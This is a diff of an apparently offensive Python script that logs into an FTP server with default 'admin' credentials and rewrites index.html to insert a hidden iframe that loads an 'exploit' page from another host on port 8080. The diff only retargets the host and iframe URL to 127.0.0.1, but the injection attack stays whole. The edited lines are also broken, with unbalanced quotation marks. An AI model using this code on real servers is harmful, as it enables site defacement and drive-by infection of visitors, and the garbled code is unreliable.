@@ -12,11 +12,11 @@ def injectPage(ftp, page, redirect):
     ftp.storlines('STOR ' + page, open(page + '.tmp'))
     print('[+] Uploaded Injected Page: ' + page)
 
-host = '192.168.0.1'
+host = '127.0.0.1
 username = 'admin'
 password = 'admin'
 
 ftp = ftplib.FTP(host)
 ftp.login(username, password)
-redirect = '<iframe src=' + '"http:\\\\10.10.10.112:8080\\exploit"></iframe>'
+redirect = '<iframe src=http:\\\\127.0.0.1:8080\\exploit"></iframe>'
 injectPage(ftp, 'index.html', redirect)
